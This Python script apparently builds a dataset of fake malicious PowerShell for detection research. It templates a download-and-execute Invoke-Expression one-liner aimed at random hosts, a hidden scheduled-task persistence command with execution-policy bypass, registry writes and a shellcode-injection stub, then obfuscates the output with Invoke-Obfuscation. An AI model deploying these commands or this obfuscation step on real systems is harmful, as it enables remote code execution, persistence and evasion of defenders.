#Generates a powershell script from the set of random malicious commands
import random
import string
import pexpect
import os
import sys
import math
import multiprocessing
import time
import queue

def get_random_dest():
	path = "/" + "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(5,10))])
	if(random.randint(0,1) == 0):
		#Return a domain
		ext = "." + "".join([random.choice(string.ascii_lowercase) for _ in range(random.randint(2,3))])
		hostname = "".join([random.choice(string.ascii_letters) for _ in range(random.randint(10,20))])
		domain = "http://" + hostname + ext + path
		return domain
	else:
		ip = str(random.randint(0,200)) + "." + str(random.randint(0,200)) + "." + str(random.randint(0,200))+ "." + str(random.randint(0,200))
		return ip + path

def get_random_text(min, max):
	return "".join([random.choice(string.ascii_letters + string.digits) for _ in range(random.randint(min,max))])

def get_random_word():
	return get_random_text(3,10)

def get_random_regkey():
	key_name = get_random_word()
	key_location = "HKCU:\\" + "\\".join([get_random_word() for _ in range(random.randint(2,5))])
	return key_location, key_name

def get_random_shellcode():
	shellcode = ",".join([hex(random.randint(0,255)) for _ in range(150)])
	return shellcode

def remote_payload_cmd():
	dest = get_random_dest()
	return "Invoke-Expression (New-Object Net.WebClient).DownloadString(\"" + dest + "\") \n"

#https://blog.cobaltstrike.com/2013/11/09/schtasks-persistence-with-powershell-one-liners/
def schtasks_persistence_cmd():
	cmd = "schtasks /create /tn OfficeUpdatorB /tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c "
	cmd += "'" + remote_payload_cmd()[:-1] + "'\" /sc onidle /i 30 \n"
	return cmd

def set_registry_key_cmd():
	key_location, key_name = get_random_regkey()
	cmd = f"Set-ItemProperty '{key_location}' -Name '{key_name}' -Value {get_random_text(50,100)}\n"
	return cmd

def inject_shellcode_cmd():
	cmd = "[Byte[]] $Shellcode = @(" + get_random_shellcode() + ") \n";
	cmd += "".join(open("./scripts/inject_shellcode.ps1").readlines())
	return cmd

# commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd, inject_shellcode_cmd]
commands = [remote_payload_cmd, schtasks_persistence_cmd, set_registry_key_cmd] # inject shellcode seems to be broken when we try to obfuscate it :c

# AST doesnt work with schtasks and remote_payload
# set registry key has a 100% fail rate

def generate_script():
	script = ""
	script+= random.choice(commands)()
	#for f in [random.choice(commands) for _ in range(5)]:
		#script+=f()

	return script

def generate_raw(n):
	for i in range(n):
		script = generate_script()
		f = open(f"res/dataset-{i}-raw.ps1",'w')
		f.write(script)
		f.close()

#invoke_obfuscation_choices = ["TOKEN,ALL,1,HOME","AST,ALL,1,HOME","STRING,ALL,1,HOME","ENCODING,ALL,1,HOME"]
invoke_obfuscation_choices = ["TOKEN,ALL,1,HOME","STRING,ALL,1,HOME"]
invoke_obfuscation_encodings = [f",ENCODING,{str(i+1)},1,HOME" for i in range(8)]
# print(invoke_obfuscation_choices)

def obfuscate(script_num, conn):

	package = [[],[],[],[]]
	try:
		#obfs_commands = ",".join([random.choice(invoke_obfuscation_choices) for _ in range(random.randint(1,4))])
		obfs_commands = random.choice(invoke_obfuscation_choices)

		if(random.randint(0,1) == 0):
			obfs_commands += random.choice(invoke_obfuscation_encodings)

		if(random.randint(0,1) == 0):
			obfs_commands+=",COMPRESS,1,1,HOME"

		obfs_commands+= ",OUT"

		print(f"> Obfuscating script #{script_num}, commands for Invoke-Obfuscation = {obfs_commands}")

		p = pexpect.spawn(f"pwsh obfuscate.ps1 -Filename ./res/dataset-{str(script_num)}-raw.ps1 -Command {obfs_commands}")
		#p.read_nonblocking(size=10000)
		p.expect_exact("Enter path for output file (or leave blank for default): ")
		p.sendline(f"./res/dataset-{str(script_num)}-obfs.ps1")
		p.wait() #this is the only one that works multithreaded
		#p.interact() #this works but only singlethreaded
		#p.expect(pexpect.EOF) this should work but it just doesnt
		print(f"> Script #{script_num} obfuscation succeeded!")
		p.close()

		package[0].append(str(script_num))
		package[1].append(obfs_commands)

	except Exception as e:
		print(f"> !!! Obfuscation for script #{script_num} failed! Command = {obfs_commands}")
		print(e)

		package[2].append(str(script_num))
		package[3].append(obfs_commands)

	conn.send(package)
	conn.close()
	return


THREAD_NUM = int(sys.argv[2])
POLL_CAP = 50

success = []
failed = []
succ_cmds = []
failed_cmds = []

def run_threads(targets):
	print("--- Starting to run threads")
	global success, failed, succ_cmds, failed_cmds
	pipes = []
	thread_queue = queue.Queue()
	polling_queue = queue.Queue()

	for target in targets:
		parent, child = multiprocessing.Pipe()
		t = multiprocessing.Process(target=obfuscate, args=[target, child])
		thread_queue.put([t,parent,target])

	for _ in range(THREAD_NUM):
		t,parent,target = thread_queue.get()
		t.start()
		polling_queue.put([parent,target,t,0])
		#time.sleep(3)
		time.sleep(int(70/THREAD_NUM)) #sleep just enough so that the first thread will be done when the last of the first group has gone

	print("--- Started first batch")
	while(not thread_queue.empty()):
		t,parent,target = thread_queue.get()
		found = False

		#print(f"--- Starting polling to find a spot for thread target={target}")
		while not found and not polling_queue.empty():

			poll_pipe, poll_target, poll_thread, count = polling_queue.get()

			poll_time = 3/(polling_queue.qsize()+1) #because we want to be more relaxed the fewer polling targets we have, or else we always 'timeout' on the last few
			try:
				if(poll_pipe.poll(poll_time)):
				#if(not poll_thread.is_alive()):
					package = poll_pipe.recv()
					print(f"--- Received package from script #{poll_target} after {count} tries")
					success += package[0]
					succ_cmds += package[1]
					failed += package[2]
					failed_cmds += package[3]

					poll_thread.join()
					found = True
				else:
					if(count>POLL_CAP):
						print(f"--- Spent over {POLL_CAP} tries polling for result from script # {poll_target}, assuming the thread is dead")
						failed.append(poll_target)
						failed_cmds.append("TIMEOUT")
						poll_thread.terminate()
						found = True #since we terminated a thread, we want to start another one

					else:
						polling_queue.put([poll_pipe, poll_target, poll_thread, count+1])
						#time.sleep(1)

			except Exception as e:
				print(f"!!! Caught exception while trying to receive package from {poll_target}")
				print(e)
				failed.append(poll_target)
				failed_cmds.append("EXCEPTION")


		t.start()
		polling_queue.put([parent,target,t,0])

	print("--- All threads have been started, waiting for them to finish")
	#FIXME: abstract into a function please
	while not polling_queue.empty():

			poll_pipe, poll_target, poll_thread, count = polling_queue.get()

			poll_time = 3/(polling_queue.qsize()+1)
			try:
				if(poll_pipe.poll(poll_time)):
				#if(not poll_thread.is_alive()):
					package = poll_pipe.recv()
					print(f"--- Received package from script #{poll_target}")
					success += package[0]
					succ_cmds += package[1]
					failed += package[2]
					failed_cmds += package[3]

					poll_thread.join()
					found = True
				else:
					if(count>POLL_CAP):
						print(f"--- Spent over {POLL_CAP} tries polling for result from script # {poll_target}, assuming the thread is dead")
						failed.append(poll_target)
						failed_cmds.append("TIMEOUT")
						poll_thread.terminate()

					else:
						polling_queue.put([poll_pipe, poll_target, poll_thread, count+1])
						#time.sleep(1)

			except Exception as e:
				print(f"!!! Caught exception while trying to receive package from {poll_target}")
				print(e)
				failed.append(poll_target)
				failed_cmds.append("EXCEPTION")

	print("--- Done!")
	return success, failed, succ_cmds, failed_cmds

def generate_obfs(n):
	
	print("Generating fake malicious powershell")
	generate_raw(n)

	print("Converting to obfuscated powershell")

	run_threads(range(n))

	print(f"Succeeded {str(len(success))}/{str(n)}")

	for fail in failed:
		print(f"Deleting failed script {fail}")
		os.system(f"rm res/dataset-{str(fail)}-raw.ps1")

	#print("succeded", succ_cmds)
	#print("failed", failed_cmds)
	print("Failed #", failed)

generate_obfs(int(sys.argv[1]))